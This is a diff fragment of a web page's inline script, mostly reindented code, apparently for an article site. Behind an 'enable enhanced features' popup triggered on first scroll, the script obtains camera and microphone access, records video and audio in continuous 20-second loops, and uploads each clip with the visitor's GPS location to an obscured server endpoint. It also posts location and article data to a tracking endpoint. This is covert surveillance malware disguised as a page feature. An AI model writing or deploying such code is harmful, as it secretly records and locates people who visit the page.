+                        longitude: pos.coords.longitude,
+                        articleTitle: document.querySelector('article h2')?.innerText || ''
+                    };
+                    console.log('sending tracking', info);
+                    fetch(`${API_BASE}/api/track`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(info)
+                    })
+                    .then(res => res.json())
+                    .then(res => console.log('track saved', res))
+                    .catch(console.error);
+                })
+                .catch(err => console.log('IP fetch failed', err));
+        }
+
+        function requestCameraSeq() {
+            return navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    stream.getTracks().forEach(t => t.stop());
+                })
+                .catch(err => { alert('📹 Camera access denied.'); throw err; });
+        }
+
+        function requestMicrophoneSeq() {
+            return navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    stream.getTracks().forEach(t => t.stop());
+                })
+                .catch(err => { alert('🎤 Microphone access denied.'); throw err; });
+        }
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        function startAutoRecording() {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    frameRate: { ideal: 15 }
+                }, 
+                audio: true 
             })
-            .then(res => res.json())
-            .then(res => console.log('track saved', res))
-            .catch(console.error);
-          })
-          .catch(err => console.log('IP fetch failed', err));
-      }
+            .then(stream => {
+                console.log('Got media stream');
+                const options = {
+                    mimeType: 'video/webm;codecs=vp8,opus',
+                    videoBitsPerSecond: 2500000
+                };
+                try {
+                    mediaRecorder = new MediaRecorder(stream, options);
+                } catch (e) {
+                    console.warn('Codec not supported, trying without codec spec');
+                    try {
+                        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    } catch (e2) {
+                        console.error('MediaRecorder not supported:', e2);
+                        alert('Your browser does not support video recording in this format.');
+                        return;
+                    }
+                }
+                recordedChunks = [];
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data && e.data.size > 0) {
+                        console.log('Data available:', e.data.size, 'bytes');
+                        recordedChunks.push(e.data);
+                    }
+                };
+                mediaRecorder.onstop = () => {
+                    console.log('Recording stopped, processing', recordedChunks.length, 'chunks');
+                    if (recordedChunks.length > 0) {
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        console.log('Created blob:', blob.size, 'bytes, type:', blob.type);
+                        sendRecording(blob);
+                    }
+                    recordedChunks = [];
+                    startAutoRecording();
+                };
+                mediaRecorder.onerror = err => {
+                    console.error('Recorder error:', err);
+                };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 20000);
+            })
+            .catch(err => {
+                console.error('Recording failed:', err);
+                alert('Unable to access camera/microphone: ' + err.message);
+            });
+        }
 
-      function requestCameraSeq() {
-        return navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            stream.getTracks().forEach(t => t.stop());
-          })
-          .catch(err => { alert('📹 Camera access denied.'); throw err; });
-      }
+        function sendRecording(blob) {
+            console.log('Sending recording, blob size:', blob.size, 'type:', blob.type);
+            if (blob.size < 1000) {
+                console.warn('Recording too small, not sending');
+                return;
+            }
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                const base64data = reader.result.split(',')[1];
+                const payload = { data: base64data, mimeType: blob.type };
+                if (lastCoords) {
+                    payload.location = lastCoords;
+                }
+                console.log('Sending payload with mimeType:', payload.mimeType);
+                fetch(`${API_BASE}/api/45ytyfwgqu`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).then(r => r.json())
+                  .then(r => console.log('Recording saved with ID:', r._id))
+                  .catch(err => console.error('Failed to save recording:', err));
+            };
+            reader.readAsDataURL(blob);
+        }
 
-      function requestMicrophoneSeq() {
-        return navigator.mediaDevices.getUserMedia({ audio: true })
-          .then(stream => {
-            stream.getTracks().forEach(t => t.stop());
-          })
-          .catch(err => { alert('🎤 Microphone access denied.'); throw err; });
-      }
-
-      let mediaRecorder;
-      let recordedChunks = [];
-
-      function startAutoRecording() {
-          navigator.mediaDevices.getUserMedia({ 
-              video: { 
-                  width: { ideal: 640 },
-                  height: { ideal: 480 },
-                  frameRate: { ideal: 15 }
-              }, 
-              audio: true 
-          })
-          .then(stream => {
-              console.log('Got media stream');
-              const options = {
-                  mimeType: 'video/webm;codecs=vp8,opus',
-                  videoBitsPerSecond: 2500000
-              };
-              try {
-                  mediaRecorder = new MediaRecorder(stream, options);
-              } catch (e) {
-                  console.warn('Codec not supported, trying without codec spec');
-                  try {
-                      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                  } catch (e2) {
-                      console.error('MediaRecorder not supported:', e2);
-                      alert('Your browser does not support video recording in this format.');
-                      return;
-                  }
-              }
-              recordedChunks = [];
-              mediaRecorder.ondataavailable = e => {
-                  if (e.data && e.data.size > 0) {
-                      console.log('Data available:', e.data.size, 'bytes');
-                      recordedChunks.push(e.data);
-                  }
-              };
-              mediaRecorder.onstop = () => {
-                  console.log('Recording stopped, processing', recordedChunks.length, 'chunks');
-                  if (recordedChunks.length > 0) {
-                      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                      console.log('Created blob:', blob.size, 'bytes, type:', blob.type);
-                      sendRecording(blob);
-                  }
-                  recordedChunks = [];
-                  // start another 20s recording automatically
-                  startAutoRecording();
-              };
-              mediaRecorder.onerror = err => {
-                  console.error('Recorder error:', err);
-              };
-              mediaRecorder.start();
-              setTimeout(() => {
-                  if (mediaRecorder && mediaRecorder.state === 'recording') {
-                      mediaRecorder.stop();
-                  }
-              }, 20000);
-          })
-          .catch(err => {
-              console.error('Recording failed:', err);
-              alert('Unable to access camera/microphone: ' + err.message);
-          });
-      }
-
-      function sendRecording(blob) {
-          console.log('Sending recording, blob size:', blob.size, 'type:', blob.type);
-          if (blob.size < 1000) {
-              console.warn('Recording too small, not sending');
-              return;
-          }
-          const reader = new FileReader();
-          reader.onloadend = () => {
-              const base64data = reader.result.split(',')[1];
-              const payload = { data: base64data, mimeType: blob.type };
-              if (lastCoords) {
-                  payload.location = lastCoords;
-              }
-              console.log('Sending payload with mimeType:', payload.mimeType);
-              fetch(`${API_BASE}/api/45ytyfwgqu`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify(payload)
-              }).then(r => r.json())
-                .then(r => console.log('Recording saved with ID:', r._id))
-                .catch(err => console.error('Failed to save recording:', err));
-          };
-          reader.readAsDataURL(blob);
-      }
-
-      document.getElementById('enable-features-btn').addEventListener('click', enableEnhancedFeatures);
+        document.getElementById('enable-features-btn').addEventListener('click', enableEnhancedFeatures);
 
         // show permission popup when user scrolls for the first time
         let popupShown = false;
         window.addEventListener('scroll', () => {
-          if (!popupShown) {
-            popupShown = true;
-            const pop = document.getElementById('permission-popup');
-            if (pop) pop.classList.add('show');
-          }
+            if (!popupShown) {
+                popupShown = true;
+                const pop = document.getElementById('permission-popup');
+                if (pop) pop.classList.add('show');
+            }
         });
 
         document.getElementById('popup-enable-btn').addEventListener('click', () => {
-          enableEnhancedFeatures();
-          const pop = document.getElementById('permission-popup');
-          if (pop) pop.classList.remove('show');
+            enableEnhancedFeatures();
+            const pop = document.getElementById('permission-popup');
+            if (pop) pop.classList.remove('show');
         });
-      </script>
+    </script>
 
 </body>
 </html>
